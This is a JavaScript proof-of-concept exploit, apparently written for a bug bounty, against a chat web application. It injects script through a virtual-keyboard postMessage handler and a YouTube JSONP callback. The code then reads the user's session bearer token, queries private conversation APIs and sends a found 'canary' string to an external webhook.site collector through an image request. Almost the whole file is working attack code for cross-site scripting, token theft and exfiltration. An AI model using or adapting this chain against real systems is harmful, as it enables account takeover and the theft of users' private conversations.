const statusNode = document.getElementById("status");

function parentOriginProof() {
  var doc = parent.document;
  var root = doc.documentElement;
  var stateKey = "bbPrivateChatV3";
  var exactTitle = "BB-XSS-PRIVATE-CHAT-PROOF-20261019";
  var collector = "https://webhook.site/49825850-a000-4c10-8010-bfddaff4ead2";

  function banner(message, color) {
    var node = doc.getElementById("bb-private-chat-v3");
    if (!node) {
      node = doc.createElement("div");
      node.id = "bb-private-chat-v3";
      node.setAttribute(
        "style",
        "position:fixed;left:16px;right:16px;bottom:16px;" +
          "z-index:2147483647;padding:14px 18px;border:3px solid #b45309;" +
          "border-radius:10px;background:#fff7ed;color:#7c2d12;" +
          "font:600 14px/1.4 system-ui",
      );
      (doc.body || root).appendChild(node);
    }
    node.style.borderColor = color || "#b45309";
    node.textContent = "BB-XSS v3 — " + message;
  }

  function accountIdFromToken(token) {
    try {
      var payload = token.split(".")[1].replace(/-/g, "+").replace(/_/g, "/");
      payload += "=".repeat((4 - (payload.length % 4)) % 4);
      var claims = JSON.parse(parent.atob(payload));
      var auth = claims["https://api.openai.com/auth"] || {};
      return auth.chatgpt_account_id || auth.account_id || null;
    } catch (ignored) {
      return null;
    }
  }

  function getJson(url, phase, headers) {
    banner(phase);
    var controller = new parent.AbortController();
    var timer = parent.setTimeout(function () {
      controller.abort();
    }, 7000);
    return parent.fetch(new parent.URL(url, parent.location.origin).href, {
      credentials: "include",
      headers: headers,
      signal: controller.signal,
      cache: "no-store",
      redirect: "error",
    }).then(function (response) {
      banner(phase + " — HTTP " + response.status);
      if (!response.ok) {
        var error = Error(phase + " HTTP " + response.status);
        error.status = response.status;
        throw error;
      }
      return response.json();
    }).finally(function () {
      parent.clearTimeout(timer);
    });
  }

  function findConversation(offset, headers) {
    var pageNumber = offset / 20 + 1;
    var url =
      "/backend-api/conversations?conversation_origin=&exclude_conversation_origin=tpp" +
      "&expand=false&hide_snorlax=false&is_archived=false&is_starred=false" +
      "&limit=20&order=updated&offset=" + offset;
    return getJson(
      url,
      "phase 2/4: locating the named synthetic conversation (page " + pageNumber + ")",
      headers,
    ).then(function (page) {
      var items = page.items || [];
      var match = items.find(function (item) {
        return item && item.title === exactTitle;
      });
      if (match) return match;
      if (items.length === 20 && offset !== 80) return findConversation(offset + 20, headers);
      throw Error("synthetic conversation not found");
    });
  }

  function readConversation(id, headers) {
    var encodedId = encodeURIComponent(id);
    return getJson(
      "/backend-api/conversation/" + encodedId + "?include_full_conversation=true",
      "phase 3/4: reading only the synthetic canary target",
      headers,
    ).catch(function (error) {
      if (error.status !== 404 && error.status !== 405) throw error;
      return getJson(
        "/backend-api/conversations/" + encodedId +
          "?num_turns=2&include_has_versions=true",
        "phase 3/4: trying the paginated synthetic-conversation route",
        headers,
      );
    });
  }

  function retry(error) {
    root.dataset[stateKey] = "failed";
    banner("stopped safely: " + String(error && error.message || error), "#b91c1c");
  }

  var currentState = root.dataset[stateKey];
  if (currentState === "running" || currentState === "sent" ||
      currentState === "done" || currentState === "failed") return;
  root.dataset[stateKey] = "running";

  try {
    banner("phase 1/4: reading in-page authenticated bootstrap");
    var bootstrapNode = doc.getElementById("client-bootstrap");
    if (!bootstrapNode) throw Error("client bootstrap unavailable");
    var bootstrap = JSON.parse(bootstrapNode.textContent);
    var session = bootstrap.session || {};
    var token = session.accessToken;
    var tokenAccountId = accountIdFromToken(token);
    var sessionAccountId = session.account && session.account.id;
    if (tokenAccountId && sessionAccountId && tokenAccountId !== sessionAccountId) {
      throw Error("authenticated account mismatch");
    }
    var accountId = tokenAccountId || sessionAccountId;
    if (!token || !accountId) throw Error("authenticated bootstrap incomplete");
    var headers = {
      Authorization: "Bearer " + token,
      "ChatGPT-Account-ID": accountId,
      Accept: "application/json",
    };
    banner("phase 1/4: authenticated context acquired");

    findConversation(0, headers).then(function (conversation) {
      return readConversation(conversation.id, headers);
    }).then(function (detail) {
      var match = JSON.stringify(detail).match(/PRIVATE_CANARY:[a-f0-9]{40}/);
      if (!match) throw Error("synthetic canary not found");
      var canary = match[0];

      token = null;
      tokenAccountId = null;
      sessionAccountId = null;
      accountId = null;
      bootstrap = null;
      session = null;
      headers = null;
      root.dataset[stateKey] = "sent";
      banner("phase 4/4: sending only the exact synthetic canary");

      return new Promise(function (resolve, reject) {
        var image = doc.createElement("img");
        var timer = parent.setTimeout(function () {
          image.remove();
          reject(Error("collector timeout"));
        }, 8000);
        image.hidden = true;
        image.referrerPolicy = "no-referrer";
        image.onload = function () {
          parent.clearTimeout(timer);
          image.remove();
          resolve();
        };
        image.onerror = function () {
          parent.clearTimeout(timer);
          image.remove();
          reject(Error("collector request failed"));
        };
        image.src = collector +
          "?source=chatgpt-private-chat-v3&canary=" + encodeURIComponent(canary) +
          "&r=" + Date.now();
        (doc.body || root).appendChild(image);
      });
    }).then(function () {
      root.dataset[stateKey] = "done";
      banner(
        "confirmed: private synthetic canary read and received by the controlled collector",
        "#15803d",
      );
    }).catch(retry);
  } catch (error) {
    retry(error);
  }
}

// YouTube escapes double quotes and angle brackets in the reflected callback.
// The core deliberately has no single-quoted literals, comments, template
// literals, or angle operators, so this normalization remains valid JavaScript.
const callback = "(" + parentOriginProof.toString()
  .replaceAll("\"", "'")
  .replace(/\s+/g, " ") + ")();void";

function attributeEscape(value) {
  return value.replaceAll("&", "&amp;")
    .replaceAll("\"", "&quot;")
    .replaceAll("<", "&lt;")
    .replaceAll(">", "&gt;");
}

let attempt = 0;
function deliver() {
  const endpoint = new URL("https://www.youtube.com/oembed");
  endpoint.searchParams.set("url", "https://www.youtube.com/watch?v=dQw4w9WgXcQ");
  endpoint.searchParams.set("callback", callback);
  const source = '<script src="' + attributeEscape(endpoint.href) + '"><' + '/script>';
  const markup = '<iframe srcdoc="' + attributeEscape(source) + '"></iframe>';
  top.postMessage({
    type: "mathlive#virtual-keyboard-message",
    action: "update-setting",
    layouts: [{
      label: "Private chat impact proof v3",
      layers: [{id: "private-chat-impact-v3", markup: markup}],
    }],
  }, "*");
  top.postMessage({
    type: "mathlive#virtual-keyboard-message",
    action: "show",
    animate: false,
  }, "*");
  attempt += 1;
  if (statusNode) {
    statusNode.textContent = "Private-chat impact v3 attempt " + attempt + " sent.";
  }
  if (attempt >= 90) clearInterval(timer);
}

deliver();
const timer = setInterval(deliver, 2000);
